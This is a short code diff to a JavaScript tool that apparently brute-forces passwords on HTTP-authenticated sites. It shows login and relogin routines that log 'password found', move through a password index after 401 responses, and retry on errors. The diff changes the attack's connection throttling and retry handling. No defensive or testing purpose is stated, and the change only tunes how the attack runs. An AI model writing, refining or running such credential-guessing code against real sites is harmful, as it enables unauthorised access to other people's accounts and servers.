@@ -50,7 +50,7 @@ function startSpider() {
 			for(c=97 ; c<123 ; c++) {
 				for(d=97 ; d<123 ; d++) {
 					
-					while(conn > 100) {
+					while(conn > 2) {
 						sleep.usleep(100000);
 					}
 
@@ -113,10 +113,9 @@ function login(url,link) {
 			console.log(url + " password found : " + body);
 			conn--;
 		} else if(!error && response.statusCode == 401) {
+			console.log('Relogin : '+ url);
 			relogin(url,link,1,0);
-		} else {
-			relogin(url,link,1,1);
-		}
+		} 
 	});
 }
 
@@ -145,7 +144,9 @@ function relogin(url,link,pwInd,errCount) {
 		    relogin(url,link,pwInd+1,0);
 	    } else {
 			if(errCount < 10) {
-				relogin(url,link,pwInd+1,errCount+1);
+				relogin(url,link,pwInd,errCount+1);
+			} else {
+				console.log('Error Stoped : ' + error);
 			}
 	    }
 	});
